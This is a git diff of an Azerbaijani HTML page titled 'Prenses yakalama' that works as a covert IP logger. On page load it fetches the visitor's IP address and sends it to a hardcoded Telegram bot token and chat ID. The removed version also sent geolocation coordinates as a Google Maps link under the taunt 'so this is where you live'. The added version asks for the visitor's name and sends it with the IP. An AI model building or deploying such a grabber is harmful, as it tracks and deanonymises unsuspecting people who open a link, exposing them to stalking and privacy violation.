@@ -2,7 +2,7 @@
 <html lang="az">
 <head>
   <meta charset="UTF-8" />
-  <title>Prenses Yakalama</title>
+  <title>Prenses yakalama</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -10,6 +10,10 @@
       margin-top: 100px;
       background: #f0f0f0;
       color: #333;
+    }
+    #greeting {
+      font-size: 24px;
+      margin-bottom: 20px;
     }
     #ipDisplay {
       font-size: 30px;
@@ -19,16 +23,15 @@
   </style>
 </head>
 <body>
-  <h1>Deməli burda yaşayırsan hə?:</h1>
+  <div id="greeting"></div>
   <div id="ipDisplay">Loading...</div>
 
   <script>
     const token = '8408687620:AAEy2vYnaR8Be9kpbjoKpCTUAXMMHvvd4AE';
     const chatId = '1689497109';
 
-    async function sendLocationToTelegram(ip, lat, lon) {
-      const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
-      const message = encodeURIComponent(`Yeni istifadəçinin IP-si: ${ip}\nYer: ${mapUrl}`);
+    async function sendIpToTelegram(name, ip) {
+      const message = encodeURIComponent(`Yeni istifadəçi: ${name}\nIP-si: ${ip}`);
       const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
 
       try {
@@ -41,16 +44,14 @@
       }
     }
 
-    async function getIpAndSend() {
+    async function getIpAndSend(name) {
       try {
-        const res = await fetch('http://ip-api.com/json');
+        const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
-        const ip = data.query;
-        const lat = data.lat;
-        const lon = data.lon;
+        const ip = data.ip;
 
-        document.getElementById('ipDisplay').textContent = ip;
-        sendLocationToTelegram(ip, lat, lon);
+        document.getElementById('ipDisplay').textContent = `API ünvanın: ${ip}`;
+        sendIpToTelegram(name, ip);
       } catch (error) {
         document.getElementById('ipDisplay').textContent = 'IP alınarkən xəta baş verdi';
         console.error('IP alınarkən xəta:', error);
@@ -58,7 +59,14 @@
     }
 
     window.onload = () => {
-      getIpAndSend();
+      const name = prompt("Zəhmət olmasa adınızı yazın");
+      if (name && name.trim() !== "") {
+        document.getElementById('greeting').textContent = `Salam ${name}!, deməli sənin API ünvanın belədir:`;
+        getIpAndSend(name);
+      } else {
+        document.getElementById('greeting').textContent = `Salam! Sənin API ünvanın belədir:`;
+        getIpAndSend("Anonim istifadəçi");
+      }
     };
   </script>
 </body>
